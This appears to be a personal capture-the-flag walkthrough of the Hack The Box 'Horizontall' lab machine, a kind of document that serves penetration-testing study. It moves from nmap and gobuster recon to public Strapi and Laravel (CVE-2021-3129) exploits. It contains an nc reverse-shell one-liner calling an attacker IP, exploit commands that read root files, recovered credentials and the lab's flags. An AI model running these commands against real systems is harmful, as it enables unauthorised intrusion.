# Horizontall by phoenix - 11.12.2021


IP = 10.10.11.105

#virtual host: horizontall.htb	10.10.11.105

# NMAP

Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# UDP NMAP

Nothing

# gobuster

/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]

# gobuster vhost -u http://horizontall.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

Found: api-prod.horizontall.htb (Status: 200) [Size: 413]


# Possible usernames found in http://horizontall.htb/reviews

wail
doe
john


# Under view-source:http://api-prod.horizontall.htb/admin/main.da91597e.chunk.js

Found the strapi version - strapi-plugin-content-type-builder@3.0.0-beta.17.4

# searchsploit

Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)           | multiple/webapps/50239.py

# Exploiting the vuln

python3 exploit.py http://api-prod.horizontall.htb/

# New credentials

admin:SuperStrongPassword1

# Create a reverse shell with NC - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.98 9001 >/tmp/f

# USER flag

b11810cfb32fe326a7c293534a069e2a


# Privesc

Linpeas:
./linpeas.sh -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt 


tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1830/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 



1337 - API calls
3306 - MySQL
8000 - ?




# Perms

strapi@horizontall:/tmp$ find / -perm /6000 2>/dev/null 
/sbin/pam_extrausers_chkpwd
/sbin/unix_chkpwd
/usr/bin/mlocate
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/bsd-write
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/at
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/wall
/usr/bin/crontab
/usr/bin/ssh-agent
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/expiry
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/share/fonts
/usr/local/lib/python3.6
/usr/local/lib/python3.6/dist-packages
/usr/local/lib/python2.7
/usr/local/lib/python2.7/dist-packages
/usr/local/lib/python2.7/site-packages
/var/mail
/var/log/journal
/var/log/journal/3cc9504f7ded4867a4c8ca16476b1378
/var/local
/bin/fusermount
/bin/ping
/bin/su
/bin/umount
/bin/mount



# Finding the network connections in linpeas output shows listener on 8000

 Laravel v8 (PHP v7.4.18)

# Exploit for the version - https://github.com/nth347/CVE-2021-3129_exploit

Needed to portforward port 8000 to attacker machine to git clone the repo

./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"


# ROOT flag d26399c38d946ce68c113a9a8de34b85